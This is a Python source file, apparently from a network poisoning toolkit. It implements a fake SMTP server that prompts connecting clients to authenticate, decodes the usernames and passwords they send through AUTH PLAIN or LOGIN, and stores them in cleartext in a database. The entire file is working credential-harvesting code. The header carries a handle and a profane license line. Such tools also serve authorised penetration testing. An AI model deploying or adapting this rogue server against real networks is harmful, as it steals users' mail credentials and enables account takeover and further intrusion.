#!/usr/bin/env python
"""
@author    : ALIF FUSOBAR
@nickname  : Xcod3bughunt3r
@license   : MIT FUCK LICENSE
@contact   : master@itsecurity.id
"""

from utils import *
from base64 import b64decode
if settings.Config.PY2OR3 == "PY3":
	from socketserver import BaseRequestHandler
else:
	from SocketServer import BaseRequestHandler
from packets import SMTPGreeting, SMTPAUTH, SMTPAUTH1, SMTPAUTH2

class ESMTP(BaseRequestHandler):

	def handle(self):
		try:
			self.request.send(NetworkSendBufferPython2or3(SMTPGreeting()))
			data = self.request.recv(1024)

			if data[0:4] == b'EHLO' or data[0:4] == b'ehlo':
				self.request.send(NetworkSendBufferPython2or3(SMTPAUTH()))
				data = self.request.recv(1024)

			if data[0:4] == b'AUTH':
				AuthPlain = re.findall(b'(?<=AUTH PLAIN )[^\r]*', data)
				if AuthPlain:
					User = list(filter(None, b64decode(AuthPlain[0]).split(b'\x00')))
					Username = User[0].decode('latin-1')
					Password = User[1].decode('latin-1')

					SaveToDb({
						'module': 'SMTP', 
						'type': 'Cleartext', 
						'client': self.client_address[0], 
						'user': Username, 
						'cleartext': Password, 
						'fullhash': Username+":"+Password,
						})

				else:
					self.request.send(NetworkSendBufferPython2or3(SMTPAUTH1()))
					data = self.request.recv(1024)
				
					if data:
						try:
							User = list(filter(None, b64decode(data).split(b'\x00')))
							Username = User[0].decode('latin-1')
							Password = User[1].decode('latin-1')
						except:
							Username = b64decode(data).decode('latin-1')

							self.request.send(NetworkSendBufferPython2or3(SMTPAUTH2()))
							data = self.request.recv(1024)

							if data:
								try: Password = b64decode(data)
								except: Password = data

						SaveToDb({
							'module': 'SMTP', 
							'type': 'Cleartext', 
							'client': self.client_address[0], 
							'user': Username, 
							'cleartext': Password, 
							'fullhash': Username+":"+Password,
						})

		except Exception:
			pass
